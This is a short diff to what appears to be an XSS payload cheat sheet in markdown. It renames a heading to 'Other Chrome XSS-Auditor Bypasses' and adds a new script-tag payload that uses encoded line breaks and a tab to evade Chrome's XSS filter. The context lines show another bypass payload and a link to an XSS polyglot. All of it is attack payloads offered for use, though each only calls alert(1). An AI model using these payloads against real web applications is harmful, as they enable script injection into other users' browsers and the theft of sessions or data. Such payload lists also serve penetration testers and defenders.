@@ -12,10 +12,14 @@
 <script src="data:,alert(1)%250A-->
 ```
 
-**Chrome XSS-Auditor Bypass**
+**Other Chrome XSS-Auditor Bypasses**
 
 ```html
 <script>alert(1)</script
+```
+
+```html
+<script>alert(1)%0d%0a-->%09</script
 ```
 
 **XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
